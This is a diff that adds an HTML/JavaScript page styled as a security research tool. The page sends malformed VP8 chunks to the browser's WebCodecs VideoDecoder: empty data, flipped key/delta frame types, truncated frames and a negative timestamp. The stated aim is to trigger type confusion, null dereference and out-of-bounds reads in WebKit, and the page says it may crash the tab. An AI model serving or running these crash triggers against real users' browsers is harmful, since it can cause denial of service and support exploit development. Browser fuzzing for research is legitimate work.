@@ -1,0 +1,419 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="WebCodecs VideoDecoder vulnerability research tool">
+    <title>WebCodecs Decoder Analysis</title>
+    <style>
+        * { box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, monospace;
+            margin: 0;
+            padding: 20px;
+            background: #0d1117;
+            color: #c9d1d9;
+            line-height: 1.6;
+        }
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+        }
+        h1 {
+            color: #58a6ff;
+            border-bottom: 2px solid #21262d;
+            padding-bottom: 10px;
+        }
+        .warning {
+            background: #da3633;
+            color: white;
+            padding: 12px 16px;
+            border-radius: 6px;
+            margin: 20px 0;
+        }
+        .info-box {
+            background: #161b22;
+            border: 1px solid #30363d;
+            border-radius: 8px;
+            padding: 16px;
+            margin: 16px 0;
+        }
+        #log {
+            background: #0d1117;
+            border: 1px solid #30363d;
+            border-radius: 6px;
+            padding: 12px;
+            max-height: 400px;
+            overflow-y: auto;
+            font-family: 'SF Mono', Monaco, monospace;
+            font-size: 13px;
+            white-space: pre-wrap;
+        }
+        .log-entry {
+            margin: 4px 0;
+            padding: 4px 8px;
+            border-radius: 4px;
+        }
+        .info { color: #58a6ff; }
+        .warn { color: #d29922; background: rgba(211, 153, 34, 0.1); }
+        .error { color: #f85149; background: rgba(248, 81, 73, 0.1); }
+        .success { color: #3fb950; }
+        button {
+            background: #238636;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 14px;
+            margin: 8px 8px 8px 0;
+        }
+        button:hover { background: #2ea043; }
+        button:disabled {
+            background: #484f58;
+            cursor: not-allowed;
+        }
+        .technique {
+            background: #21262d;
+            border-left: 3px solid #58a6ff;
+            padding: 12px;
+            margin: 12px 0;
+            border-radius: 0 6px 6px 0;
+        }
+        canvas { display: none; }
+        .status {
+            display: inline-block;
+            padding: 4px 8px;
+            border-radius: 4px;
+            font-size: 12px;
+            font-weight: 600;
+        }
+        .status.ready { background: #238636; color: white; }
+        .status.unsupported { background: #da3633; color: white; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔬 WebCodecs VideoDecoder Analysis</h1>
+        
+        <div class="warning">
+            ⚠️ <strong>Security Research Tool</strong> — This page tests browser decoder vulnerabilities 
+            and may crash your tab. Use in a controlled environment only.
+        </div>
+
+        <div class="info-box">
+            <p><strong>API Status:</strong> <span id="api-status" class="status">Checking...</span></p>
+            <p>This tool demonstrates type confusion vulnerabilities in WebKit's WebCodecs implementation 
+            through malformed video decoder inputs.</p>
+        </div>
+
+        <div class="technique">
+            <strong>Test 1: Empty Data Injection</strong>
+            <p>Sends zero-byte chunks to trigger null pointer dereferences in VP8 parsing.</p>
+            <button onclick="runTest('empty')" id="btn-empty">Run Test</button>
+        </div>
+
+        <div class="technique">
+            <strong>Test 2: Type Confusion</strong>
+            <p>Mislabels delta frames as keyframes to confuse reference frame management.</p>
+            <button onclick="runTest('type-confusion')" id="btn-type">Run Test</button>
+        </div>
+
+        <div class="technique">
+            <strong>Test 3: Truncated Data</strong>
+            <p>Sends partial frame data to trigger out-of-bounds reads.</p>
+            <button onclick="runTest('truncated')" id="btn-truncated">Run Test</button>
+        </div>
+
+        <div class="technique">
+            <strong>Test 4: All Techniques</strong>
+            <p>Runs all tests sequentially.</p>
+            <button onclick="runAllTests()" id="btn-all">Run All Tests</button>
+        </div>
+
+        <h3>Execution Log</h3>
+        <div id="log"></div>
+
+        <canvas id="c" width="320" height="240"></canvas>
+    </div>
+
+<script>
+// ============================================================================
+// WebCodecs VideoDecoder Crash Analysis Tool
+// ============================================================================
+
+const CONFIG = {
+    codec: "vp8",
+    width: 320,
+    height: 240,
+    maxStoredChunks: 20
+};
+
+let encodedVideoChunks = [];
+let lastVideoDecoderConfig = null;
+let videoEncoder = null;
+let videoDecoder = null;
+let isRunning = false;
+
+// Logger
+function log(msg, type = 'info') {
+    const el = document.getElementById('log');
+    const entry = document.createElement('div');
+    entry.className = `log-entry ${type}`;
+    entry.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+    el.appendChild(entry);
+    el.scrollTop = el.scrollHeight;
+    console.log(`[${type}] ${msg}`);
+}
+
+function clearLog() {
+    document.getElementById('log').innerHTML = '';
+}
+
+// Check API support
+function checkSupport() {
+    const hasEncoder = typeof VideoEncoder !== 'undefined';
+    const hasDecoder = typeof VideoDecoder !== 'undefined';
+    const hasFrame = typeof VideoFrame !== 'undefined';
+    const hasChunk = typeof EncodedVideoChunk !== 'undefined';
+    
+    const statusEl = document.getElementById('api-status');
+    
+    if (hasEncoder && hasDecoder && hasFrame && hasChunk) {
+        statusEl.textContent = 'Ready';
+        statusEl.className = 'status ready';
+        return true;
+    } else {
+        statusEl.textContent = 'Not Supported';
+        statusEl.className = 'status unsupported';
+        log('WebCodecs API not supported in this browser', 'error');
+        return false;
+    }
+}
+
+// Initialize encoder/decoder
+async function initCodecs() {
+    if (!checkSupport()) return false;
+    
+    videoEncoder = new VideoEncoder({
+        output: (chunk, metadata) => {
+            if (encodedVideoChunks.length < CONFIG.maxStoredChunks) {
+                encodedVideoChunks.push({ chunk, metadata });
+            }
+            if (metadata?.decoderConfig) {
+                lastVideoDecoderConfig = metadata.decoderConfig;
+            }
+        },
+        error: (e) => log(`Encoder error: ${e.message}`, 'error')
+    });
+
+    videoDecoder = new VideoDecoder({
+        output: (frame) => {
+            log(`Frame decoded: ${frame.timestamp}`);
+            frame.close();
+        },
+        error: (e) => log(`Decoder error: ${e.message}`, 'error')
+    });
+
+    videoEncoder.configure({
+        codec: CONFIG.codec,
+        width: CONFIG.width,
+        height: CONFIG.height
+    });
+
+    // Create and encode a frame
+    const canvas = document.getElementById('c');
+    const ctx = canvas.getContext('2d');
+    ctx.fillStyle = '#ff0000';
+    ctx.fillRect(0, 0, CONFIG.width, CONFIG.height);
+    
+    const frame = new VideoFrame(canvas, { timestamp: 0 });
+    videoEncoder.encode(frame);
+    frame.close();
+    
+    await videoEncoder.flush();
+    
+    if (lastVideoDecoderConfig) {
+        videoDecoder.configure(lastVideoDecoderConfig);
+    }
+    
+    log(`Initialized - ${encodedVideoChunks.length} chunks buffered`);
+    return true;
+}
+
+// Test: Empty data injection
+async function testEmptyData() {
+    log('Running: Empty Data Injection', 'warn');
+    
+    const emptyChunk = new EncodedVideoChunk({
+        type: "key",
+        timestamp: 1000000,
+        data: new Uint8Array(0)
+    });
+    
+    try {
+        videoDecoder.decode(emptyChunk);
+        log('Empty chunk submitted (may crash async)', 'info');
+        await videoDecoder.flush().catch(() => {});
+    } catch (e) {
+        log(`Error: ${e.message}`, 'error');
+    }
+}
+
+// Test: Type confusion
+async function testTypeConfusion() {
+    log('Running: Type Confusion Attack', 'warn');
+    
+    if (encodedVideoChunks.length === 0) {
+        log('No encoded chunks available', 'error');
+        return;
+    }
+    
+    const original = encodedVideoChunks[0].chunk;
+    const buf = new Uint8Array(original.byteLength);
+    original.copyTo(buf);
+    
+    // Flip the type - core confusion
+    const confusedType = original.type === "key" ? "delta" : "key";
+    log(`Flipping ${original.type} → ${confusedType}`, 'info');
+    
+    const confusedChunk = new EncodedVideoChunk({
+        type: confusedType,
+        timestamp: original.timestamp,
+        data: buf
+    });
+    
+    try {
+        videoDecoder.decode(confusedChunk);
+        log('Confused chunk submitted', 'info');
+        await videoDecoder.flush().catch(() => {});
+    } catch (e) {
+        log(`Error: ${e.message}`, 'error');
+    }
+}
+
+// Test: Truncated data
+async function testTruncated() {
+    log('Running: Truncated Data Attack', 'warn');
+    
+    if (encodedVideoChunks.length === 0) {
+        log('No encoded chunks available', 'error');
+        return;
+    }
+    
+    const original = encodedVideoChunks[0].chunk;
+    const originalData = new Uint8Array(original.byteLength);
+    original.copyTo(originalData);
+    
+    // Keep only first 10 bytes
+    const truncated = originalData.slice(0, 10);
+    log(`Truncating ${original.byteLength} → 10 bytes`, 'info');
+    
+    const truncatedChunk = new EncodedVideoChunk({
+        type: original.type,
+        timestamp: original.timestamp,
+        data: truncated
+    });
+    
+    try {
+        videoDecoder.decode(truncatedChunk);
+        log('Truncated chunk submitted', 'info');
+        await videoDecoder.flush().catch(() => {});
+    } catch (e) {
+        log(`Error: ${e.message}`, 'error');
+    }
+}
+
+// Run specific test
+async function runTest(type) {
+    if (isRunning) {
+        log('Tests already running...', 'warn');
+        return;
+    }
+    
+    isRunning = true;
+    setButtonsDisabled(true);
+    
+    if (encodedVideoChunks.length === 0) {
+        log('Initializing codecs...');
+        await initCodecs();
+    }
+    
+    switch (type) {
+        case 'empty':
+            await testEmptyData();
+            break;
+        case 'type-confusion':
+            await testTypeConfusion();
+            break;
+        case 'truncated':
+            await testTruncated();
+            break;
+    }
+    
+    log('Test completed');
+    isRunning = false;
+    setButtonsDisabled(false);
+}
+
+// Run all tests
+async function runAllTests() {
+    if (isRunning) return;
+    
+    clearLog();
+    isRunning = true;
+    setButtonsDisabled(true);
+    
+    log('Initializing...');
+    await initCodecs();
+    
+    log('\n=== Starting All Tests ===', 'success');
+    
+    await testEmptyData();
+    await new Promise(r => setTimeout(r, 500));
+    
+    await testTypeConfusion();
+    await new Promise(r => setTimeout(r, 500));
+    
+    await testTruncated();
+    await new Promise(r => setTimeout(r, 500));
+    
+    // Negative timestamp test
+    log('\nRunning: Timestamp Manipulation', 'warn');
+    const negativeChunk = new EncodedVideoChunk({
+        type: "key",
+        timestamp: -999999999,
+        data: new Uint8Array(10)
+    });
+    try {
+        videoDecoder.decode(negativeChunk);
+        log('Negative timestamp chunk submitted');
+    } catch (e) {
+        log(`Error: ${e.message}`, 'error');
+    }
+    
+    log('\n=== All Tests Completed ===', 'success');
+    
+    // Cleanup
+    videoEncoder?.close();
+    videoDecoder?.close();
+    encodedVideoChunks = [];
+    
+    isRunning = false;
+    setButtonsDisabled(false);
+}
+
+function setButtonsDisabled(disabled) {
+    ['btn-empty', 'btn-type', 'btn-truncated', 'btn-all'].forEach(id => {
+        document.getElementById(id).disabled = disabled;
+    });
+}
+
+// Initialize on load
+document.addEventListener('DOMContentLoaded', () => {
+    checkSupport();
+    log('Ready. Click a test button to begin.');
+});
+</script>
+</body>
+</html>
